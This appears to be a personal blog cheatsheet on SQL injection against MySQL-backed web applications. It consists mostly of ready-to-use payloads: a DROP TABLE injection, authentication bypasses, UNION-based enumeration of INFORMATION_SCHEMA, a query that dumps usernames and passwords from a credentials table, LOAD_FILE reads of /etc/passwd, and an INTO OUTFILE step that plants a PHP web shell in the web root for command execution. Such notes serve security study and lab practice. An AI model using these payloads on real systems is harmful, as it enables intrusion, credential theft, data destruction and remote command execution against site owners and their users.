---
layout: post
title: "Cheatsheet-SQL-Injection"
description: Cheatsheet covering the fundamentals of SQL Injection.
---
<p>These cheatsheets serve as my personal quick reference. Therefore, they’re less organized than the box walkthroughs, but I’ve shared them in case others find them useful.</p>


<h2>SQL injection cheatsheet</h2>

<h3>Example of vulnerable PHP code</h3>
<p>User input is directly passed in the SQL query.</p>
<pre>
$conn = new mysqli("localhost", "root", "password", "users");
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
</pre>
<p>Example with regular user input:</p>
<pre>
select * from logins where username like '%admin'
</pre>
<p>Exploited by closing the ' ', need to enter a ';</p>
<pre>
'%1'; DROP TABLE users;'
</pre>
<p>Then, the query becomes:</p>
<pre>
select * from logins where username like '%1'; DROP TABLE users; -- ' (need to get rid of second ')
</pre>

<h3>Authentication bypass</h3>
<p>Example of query being used for authentication:</p>
<pre>
SELECT * FROM logins WHERE username='admin' AND password = 'admin';
</pre>

<h4>Verify whether application is vulnerable</h4>
<p>Insert one of the following payloads in one of the fields:</p>
<pre>
'
"
#
;
&#41;
</pre>
<p>Tip: Try URL-encoded as well</p>

<h4>Auth bypass with KNOWN username</h4>
<h5>METHOD: OR Injection</h5>
<p>The query will be something like this:</p>
<pre>
SELECT * FROM logins WHERE username=''' AND password = 'something'; --> Syntax error --> probably seen in site response
</pre>
<p>Bypassing of the authentication can be done with OR injection:</p>
<pre>
admin' OR '1'='1
</pre>
<p>Query becomes:</p>
<pre>
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';
</pre>
<p>The AND has priority of the OR.Therefore, the statement can be grouped as such:</p>
<pre>
WHERE username='admin' OR ( '1'='1' AND password='something' )
</pre>
<p>Evaluation results in:</p>
<pre>
WHERE username='admin' OR ( TRUE AND FALSE )
</pre>
<p>Further evaluation:</p>
<pre>
WHERE username='admin' OR (FALSE )
</pre>
<p>Further evaluation:</p>
<pre>
WHERE TRUE OR (FALSE) --> TRUE auth bypass 
</pre>
<p>Note that this works only when the username is known</p>

<h5>METHOD: COMMENT Injection</h5>
<p>Payload:</p>
<pre>
admin' -- -
something
</pre>
<p>The query will be:</p>
<pre>
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
</pre>
<p>Note that this works only when the username is known</p>


<h4>Auth bypass with UNKNOWN username</h4>
<h5>METHOD: OR Injection</h5>
<p>For this, we need both fields to always return true. Then, the user present in the first row will be logged in.</p>
<p>payload:</p>
<pre>
' OR '1'='1 (username field)
' OR '1'='1 (password field)
</pre>
<p>Now, we get the following query:</p>
<pre>
SELECT * FROM logins WHERE username='' OR '1'='1' AND password='' OR '1'='1';
</pre>
<p>This is evaluated as follows:</p>
<pre>
WHERE username='' OR ('1'='1' AND password='') OR '1'='1'
</pre>
<pre>
WHERE FALSE OR (TRUE AND FALSE) OR TRUE
</pre>
<pre>
WHERE FALSE OR FALSE OR TRUE
</pre>
<pre>
TRUE
</pre>
<p>Query is always true. Therefore, the first row is returned and that user is now logged in.</p>

<h4>Union Injection</h4>
<h5>Detect number of columns</h5>
<p>Order by method:</p>
<pre>
' order by 1-- -
</pre>
<p>Keep increasing until receive an error --> you know the amount of columns.</p>
<p>UNION method:</p>
<pre>
' UNION select 1,2,3-- -
</pre>
<p>Keep changing the numbers until it works.</p>

<h5>Location of Injection</h5>
<p>Often, not all columns are displayed on a web page. Therefore, we need to make sure our injection takes place in a column that is visible on the webpage. Otherwise, we will not see it's outputs.</p>
<pre>
' UNION select 1,@@version,3,4-- - (testing what columns are displayed)
</pre>

<h4>Database Enumeration</h4>
<h5>Identifying MYSQL</h5>
<p>To identify whether it is MYSQL, use one of the following queries:</p>
<table cellpadding="6" cellspacing="0">
  <thead>
    <tr>
      <th>Query</th>
      <th>Scenario</th>
      <th>Output in MySQL/MariaDB</th>
      <th>Behavior in Other DBMS</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>SELECT @@version</code></td>
      <td>When we have full query output</td>
      <td>MySQL Version (e.g., <code>10.3.22-MariaDB-1ubuntu1</code>)</td>
      <td>In MSSQL it returns MSSQL version. Error with other DBMS.</td>
    </tr>
    <tr>
      <td><code>SELECT POW(1,1)</code></td>
      <td>When we only have numeric output</td>
      <td><code>1</code></td>
      <td>Error with other DBMS</td>
    </tr>
    <tr>
      <td><code>SELECT SLEEP(5)</code></td>
      <td>Blind/No Output</td>
      <td>Delays page response for 5 seconds and returns <code>0</code></td>
      <td>Will not delay response with other DBMS</td>
    </tr>
  </tbody>
</table>
<h5>Getting data from INFORMATION_SCHEMA Database</h5>
<p>This database gets us information about the which databases are present as well as their tables and columns.</p>
<p>To find all databases:</p>
<pre>
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
</pre>
<p>UNION injection example: </p>
<pre>
UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
</pre>
<p>Find current selected database:</p>
<pre>
SELECT database();
' UNION select 1,database(),2,3-- -
</pre>
<p>Find table_names and their respected database (table_schema):</p>
<pre>
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
note that the where can be omitted
</pre>
<p>DUMP columns out table:</p>
<pre>
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
</pre>
<p>DUMP the data:</p>
<pre>
' UNION select 1, username, password, 4 from dev.credentials-- -
</pre>

<h4>Reading Files</h4>
<p>Need FILE privilege</p>
<p>Check current user:</p>
<pre>
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
' UNION SELECT 1, user(), 3, 4-- -
' UNION SELECT 1, user, 3, 4 from mysql.user--
</pre>
<p>Check user privileges:</p>
<pre>
SELECT super_priv FROM mysql.user
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- - (can add where="current_user"  when lot's of users)
</pre>
<p>Returns Y or N</p>
<p>Check other privileges:</p>
<pre>
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- - (can add where grantee="'current_user@localhost'" when lot's of users)
</pre>
<p>Read files:</p>
<pre>
SELECT LOAD_FILE('/etc/passwd');
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
</pre>

<h4>Writing Files</h4>
<p>Need FILE privilege, secure_file_priv and write access at location backend server</p>
<p>Check secure_file_priv global variable:</p>
<pre>
SHOW VARIABLES LIKE 'secure_file_priv'; (not via union)
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - (union)
</pre>
<p>If variable is empty --> read/write to entire file system. If variable has a directory --> only read write to that directory. If variable == null --> can't read/write</p>
<p>We can write files using the following syntax:</p>
<pre>
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt'; (use to write reverse shell)
' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
</pre>
<p>Note that /var/www/html is the web root for apache servers</p>

<h4>Writing Files: Web Shell</h4>
<pre>
' union select "",'&lt;?php system($_REQUEST["cmd"]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -
</pre>
<p>Surf to the webroot with ?cmd=command in the url as a parameter to execute commands.</p>









